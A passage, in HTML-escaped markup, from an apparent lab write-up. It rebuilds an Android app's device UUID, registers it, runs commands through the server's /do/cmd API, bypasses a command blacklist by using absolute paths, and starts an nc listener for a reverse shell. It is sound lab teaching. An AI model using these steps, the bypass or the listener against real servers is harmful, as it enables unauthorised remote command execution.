&lt;span class="code-line"&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CallAPI&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/register/new&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us wrote some Java to generate this ID for us:&lt;/p&gt;
&lt;p&gt;Our &lt;code&gt;object&lt;/code&gt; and &lt;code&gt;object2&lt;/code&gt; variables are named generically by the debugger. We
can see in the code above that &lt;code&gt;object&lt;/code&gt; is a string containing the device ID and
that &lt;code&gt;object2&lt;/code&gt; is a string containing the serial number of the Sim card.
Moreover the line where the code generate the new UUID (see the
&lt;a href="http://docs.oracle.com/javase/1.5.0/docs/api/java/util/UUID.html"&gt;javadoc&lt;/a&gt; for
more information about this object) use an other variable accessible on the
phone: the android ID.&lt;/p&gt;
&lt;p&gt;With all this information we come easily with the following code:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kn"&gt;import&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nn"&gt;java.util.UUID&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="kd"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;HelloWorld&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="kd"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;static&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;args&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;deviceId&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;12345&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SimSerialNumber&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;67890&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;androidId&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;34567&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UUID&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;androidId&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;deviceId&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SimSerialNumber&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="p"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We compile this code with &lt;code&gt;javac&lt;/code&gt; and execute it with &lt;code&gt;java&lt;/code&gt; (yeah I have named
it HelloWorld):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine ~]$ java HelloWorld&lt;/span&gt;
&lt;span class="code-line"&gt;00000000-02e7-1fb5-0000-000003daceff&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can now try again the URL with this UUID sent in a post parameter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine ~]$ curl --data &amp;#39;uuid=00000000-02e7-1fb5-0000-000003daceff&amp;#39; https://192.168.56.101/register/new --insecure&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;registered&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;message&amp;quot;:&amp;quot;The requested UUID is now registered.&amp;quot;,&amp;quot;token&amp;quot;:&amp;quot;t6nsb2SrfYKqsp8JIdbEscwfwA6JEeUh&amp;quot;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Great we are registered, what's next?&lt;/p&gt;
&lt;h3 id="command-execution-and-commandactivityjava"&gt;Command execution and CommandActivity.java&lt;/h3&gt;
&lt;p&gt;Line 111 in the file &lt;code&gt;CommandActivity.java&lt;/code&gt; we see the doCmd method that seems
to execute commands on the server via HTTP:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="kd"&gt;public&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;void&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nf"&gt;doCmd&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;View&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Toast&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;makeText&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Context&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CharSequence&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Running command: &amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getTag&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;()),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="na"&gt;show&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Base64&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;encodeToString&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getTag&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getBytes&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TelephonyManager&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getBaseContext&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getSystemService&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;phone&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;string2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getDeviceId&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSimSerialNumber&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;string2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;UUID&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Settings&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Secure&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ContentResolver&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getContentResolver&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;android_id&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)).&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;string2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="p"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSharedPreferences&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2131099666&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;api_server&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="n"&gt;object3&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object3&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;api_auth_token&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;CallAPI&lt;/span&gt;&lt;span class="p"&gt;().&lt;/span&gt;&lt;span class="na"&gt;execute&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;quot;/do/cmd/&amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;string2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;object3&lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The View object in parameter is the command to execute. The command is just
base64 encoded before sending it to the server as &lt;code&gt;object&lt;/code&gt; in the url, the
string2&lt;code&gt;parameter is the UUID we generate a few lines ago sent in the HTTP
header as 'X-UUID'
parameter, the&lt;/code&gt;object3` parameter is the token to authenticate to the API given
with the curl command just before also sent in the header as 'X-Token' (you may
need to look at the CallAPI method and more particulary at line 182 and 183)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine ~]$ curl   https://192.168.56.101/do/cmd/$(echo -ne id | base64) --header &amp;quot;X-UUID: 00000000-02e7-1fb5-0000-000003daceff&amp;quot; --header &amp;quot;X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18&amp;quot; --insecure&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;id&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;uid=998(nginx) gid=997(nginx) groups=997(nginx)\n&amp;quot;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We can execute command on the server, let us wrote a simple bash script to
simplify the next steps (we put an echo at the end to have a nice output):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;curl   https://192.168.56.101/do/cmd/&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -ne &lt;span class="nv"&gt;$1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64&lt;span class="k"&gt;)&lt;/span&gt; --header &lt;span class="s2"&gt;&amp;quot;X-UUID: 00000000-02e7-1fb5-0000-000003daceff&amp;quot;&lt;/span&gt; --header &lt;span class="s2"&gt;&amp;quot;X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18&amp;quot;&lt;/span&gt; --insecure&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Let us gather some information about the system (there is a blacklist that block
us and forgive us to directly use &lt;code&gt;ls&lt;/code&gt; but the absolute path works):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@rootine ~]$ ./p ls&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;status&amp;quot;:&amp;quot;error&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;Command &amp;#39;ls&amp;#39; contains a banned command.&amp;quot;}&lt;/span&gt;
&lt;span class="code-line"&gt;[maggick@rootine ~]$ ./p /bin/ls&lt;/span&gt;
&lt;span class="code-line"&gt;{&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;\/bin\/ls&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;index.php\ntest.php\n&amp;quot;}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="shell-exploitation"&gt;Shell exploitation&lt;/h2&gt;
&lt;h3 id="reverse-shell"&gt;Reverse shell&lt;/h3&gt;
&lt;p&gt;From there we can get an interactive reverse shell. Let us use the php reverse
shell from
&lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentestmonkey&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;We need to listen on our host machine for the server connection:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nc -v -n -l -p 8080&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Then we need to open the connection from the server:&lt;/p&gt;
